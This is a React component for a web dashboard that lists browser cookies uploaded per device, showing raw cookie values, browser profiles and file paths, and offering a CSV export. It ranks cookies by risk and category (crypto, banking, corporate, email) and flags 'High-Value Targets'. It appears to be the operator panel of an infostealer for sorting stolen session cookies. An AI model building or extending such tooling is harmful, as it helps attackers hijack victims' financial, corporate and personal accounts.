"use client"

import { useEffect, useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Cookie, Download, Shield, AlertTriangle, CheckCircle, Lock, Globe } from "lucide-react"
import { toast } from "sonner"

interface CookiesTableProps {
  deviceId: string
}

interface CookieData {
  id: number
  host_key: string
  name: string
  value: string
  path: string
  expires_utc: string
  is_secure: boolean
  is_httponly: boolean
  has_expires: boolean
  is_persistent: boolean
  samesite: string | null
  primary_category: string
  categories: string[]
  risk_level: string
  risk_score: number
  browser: string
  profile: string
  file_path: string
  created_at: string
}

interface CookiesResponse {
  success: boolean
  device_id: string
  device_name: string
  upload_date: string
  filters: {
    category: string | null
    risk: string | null
  }
  stats: {
    total_cookies: number
    unique_domains: number
    unique_browsers: number
    secure_cookies: number
    httponly_cookies: number
    persistent_cookies: number
    critical_risk: number
    high_risk: number
    medium_risk: number
    low_risk: number
    crypto_cookies: number
    banking_cookies: number
    corporate_cookies: number
    email_cookies: number
    cloud_cookies: number
    social_cookies: number
    ecommerce_cookies: number
    gaming_cookies: number
  }
  cookies: {
    all: CookieData[]
    by_category: Record<string, CookieData[]>
    by_risk: Record<string, CookieData[]>
    by_domain: Record<string, CookieData[]>
    top_domains: Array<{
      domain: string
      count: number
      primary_category: string
      risk_level: string
      risk_score: number
    }>
    high_value_targets: CookieData[]
  }
}

export function CookiesTable({ deviceId }: CookiesTableProps) {
  const [data, setData] = useState<CookiesResponse | null>(null)
  const [loading, setLoading] = useState(true)
  const [categoryFilter, setCategoryFilter] = useState<string>("all")
  const [riskFilter, setRiskFilter] = useState<string>("all")

  useEffect(() => {
    fetchCookies()
  }, [deviceId, categoryFilter, riskFilter])

  const fetchCookies = async () => {
    try {
      setLoading(true)
      let url = `/api/v1/cookies/${deviceId}`
      const params = new URLSearchParams()

      if (categoryFilter !== "all") {
        params.append("category", categoryFilter)
      }
      if (riskFilter !== "all") {
        params.append("risk", riskFilter)
      }

      if (params.toString()) {
        url += `?${params.toString()}`
      }

      const response = await fetch(url)
      const result = await response.json()

      if (result.success) {
        setData(result)
      } else {
        toast.error(result.error || "Failed to fetch cookies")
      }
    } catch (error) {
      console.error("Error fetching cookies:", error)
      toast.error("Failed to fetch cookies")
    } finally {
      setLoading(false)
    }
  }

  const exportCookies = () => {
    if (!data || data.cookies.all.length === 0) {
      toast.error("No cookies to export")
      return
    }

    const csv = [
      ["Domain", "Name", "Value", "Category", "Risk Level", "Risk Score", "Secure", "HttpOnly", "Browser"].join(","),
      ...data.cookies.all.map(cookie =>
        [
          cookie.host_key,
          cookie.name,
          `"${cookie.value.replace(/"/g, '""')}"`,
          cookie.primary_category,
          cookie.risk_level,
          cookie.risk_score,
          cookie.is_secure,
          cookie.is_httponly,
          cookie.browser
        ].join(",")
      )
    ].join("\n")

    const blob = new Blob([csv], { type: 'text/csv' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `cookies-${deviceId}-${Date.now()}.csv`
    a.click()
    URL.revokeObjectURL(url)
    toast.success(`Exported ${data.cookies.all.length} cookies`)
  }

  const getRiskBadge = (level: string, score: number) => {
    switch (level) {
      case 'critical':
        return <Badge variant="destructive" className="bg-red-600">CRITICAL ({score})</Badge>
      case 'high':
        return <Badge variant="destructive">HIGH ({score})</Badge>
      case 'medium':
        return <Badge className="bg-yellow-600">MEDIUM ({score})</Badge>
      case 'low':
        return <Badge variant="secondary">LOW ({score})</Badge>
      default:
        return <Badge variant="outline">UNKNOWN</Badge>
    }
  }

  const getCategoryBadge = (category: string) => {
    const colors: Record<string, string> = {
      crypto: "bg-orange-600",
      banking: "bg-green-600",
      corporate: "bg-blue-600",
      email: "bg-purple-600",
      cloud: "bg-cyan-600",
      social: "bg-pink-600",
      ecommerce: "bg-indigo-600",
      gaming: "bg-violet-600"
    }

    return (
      <Badge className={colors[category] || "bg-gray-600"}>
        {category.toUpperCase()}
      </Badge>
    )
  }

  if (loading) {
    return <div className="text-center py-8">Loading cookies...</div>
  }

  if (!data) {
    return <div className="text-center py-8">No cookie data available</div>
  }

  return (
    <div className="space-y-4">
      {/* High-Value Targets Alert */}
      {data.cookies.high_value_targets.length > 0 && (
        <Card className="border-red-500/20 bg-red-500/5">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-red-500">
              <AlertTriangle className="h-5 w-5" />
              High-Value Targets Detected
            </CardTitle>
            <CardDescription>
              {data.cookies.high_value_targets.length} high-risk cookies found in critical categories (crypto, banking, corporate)
            </CardDescription>
          </CardHeader>
        </Card>
      )}

      {/* Stats Overview */}
      <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Total Cookies</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{data.stats.total_cookies}</div>
            <p className="text-xs text-muted-foreground">{data.stats.unique_domains} domains</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Crypto</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-orange-500">{data.stats.crypto_cookies}</div>
            <p className="text-xs text-muted-foreground">crypto cookies</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Banking</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-500">{data.stats.banking_cookies}</div>
            <p className="text-xs text-muted-foreground">banking cookies</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Corporate</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-blue-500">{data.stats.corporate_cookies}</div>
            <p className="text-xs text-muted-foreground">corporate cookies</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">High Risk</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-red-500">
              {data.stats.critical_risk + data.stats.high_risk}
            </div>
            <p className="text-xs text-muted-foreground">critical/high risk</p>
          </CardContent>
        </Card>
      </div>

      {/* Filters and Export */}
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <div>
              <CardTitle className="flex items-center gap-2">
                <Cookie className="h-5 w-5" />
                Raw Cookies
              </CardTitle>
              <CardDescription>
                Browser cookies with risk scoring and categorization
              </CardDescription>
            </div>
            <Button variant="outline" size="sm" onClick={exportCookies}>
              <Download className="h-4 w-4 mr-2" />
              Export CSV
            </Button>
          </div>
        </CardHeader>
        <CardContent>
          <div className="flex gap-4 mb-4">
            <div className="flex items-center gap-2">
              <label className="text-sm font-medium">Category:</label>
              <Select value={categoryFilter} onValueChange={setCategoryFilter}>
                <SelectTrigger className="w-40">
                  <SelectValue placeholder="All" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Categories</SelectItem>
                  <SelectItem value="crypto">Crypto</SelectItem>
                  <SelectItem value="banking">Banking</SelectItem>
                  <SelectItem value="corporate">Corporate</SelectItem>
                  <SelectItem value="email">Email</SelectItem>
                  <SelectItem value="cloud">Cloud</SelectItem>
                  <SelectItem value="social">Social</SelectItem>
                  <SelectItem value="ecommerce">E-commerce</SelectItem>
                  <SelectItem value="gaming">Gaming</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="flex items-center gap-2">
              <label className="text-sm font-medium">Risk:</label>
              <Select value={riskFilter} onValueChange={setRiskFilter}>
                <SelectTrigger className="w-32">
                  <SelectValue placeholder="All" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Risks</SelectItem>
                  <SelectItem value="critical">Critical</SelectItem>
                  <SelectItem value="high">High</SelectItem>
                  <SelectItem value="medium">Medium</SelectItem>
                  <SelectItem value="low">Low</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          <ScrollArea className="h-[600px]">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Domain</TableHead>
                  <TableHead>Name</TableHead>
                  <TableHead>Value</TableHead>
                  <TableHead>Category</TableHead>
                  <TableHead>Risk</TableHead>
                  <TableHead>Security</TableHead>
                  <TableHead>Browser</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {data.cookies.all.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={7} className="text-center py-8 text-muted-foreground">
                      No cookies found matching the selected filters
                    </TableCell>
                  </TableRow>
                ) : (
                  data.cookies.all.map((cookie) => (
                    <TableRow key={cookie.id}>
                      <TableCell className="font-medium">
                        <div className="flex items-center gap-2">
                          <Globe className="h-4 w-4 text-muted-foreground" />
                          {cookie.host_key}
                        </div>
                      </TableCell>
                      <TableCell className="font-mono text-xs">{cookie.name}</TableCell>
                      <TableCell className="max-w-xs truncate font-mono text-xs">
                        {cookie.value}
                      </TableCell>
                      <TableCell>{getCategoryBadge(cookie.primary_category)}</TableCell>
                      <TableCell>{getRiskBadge(cookie.risk_level, cookie.risk_score)}</TableCell>
                      <TableCell>
                        <div className="flex flex-col gap-1">
                          {cookie.is_secure && (
                            <Badge variant="outline" className="flex items-center gap-1 w-fit text-xs">
                              <Lock className="h-3 w-3" />
                              Secure
                            </Badge>
                          )}
                          {cookie.is_httponly && (
                            <Badge variant="outline" className="flex items-center gap-1 w-fit text-xs">
                              <Shield className="h-3 w-3" />
                              HttpOnly
                            </Badge>
                          )}
                        </div>
                      </TableCell>
                      <TableCell>{cookie.browser}</TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </ScrollArea>
        </CardContent>
      </Card>

      {/* Top Domains */}
      <Card>
        <CardHeader>
          <CardTitle>Top Domains by Cookie Count</CardTitle>
        </CardHeader>
        <CardContent>
          <ScrollArea className="h-[300px]">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Domain</TableHead>
                  <TableHead>Cookies</TableHead>
                  <TableHead>Category</TableHead>
                  <TableHead>Risk</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {data.cookies.top_domains.map((domain, index) => (
                  <TableRow key={index}>
                    <TableCell className="font-medium">{domain.domain}</TableCell>
                    <TableCell>{domain.count}</TableCell>
                    <TableCell>{getCategoryBadge(domain.primary_category)}</TableCell>
                    <TableCell>{getRiskBadge(domain.risk_level, domain.risk_score)}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </ScrollArea>
        </CardContent>
      </Card>
    </div>
  )
}
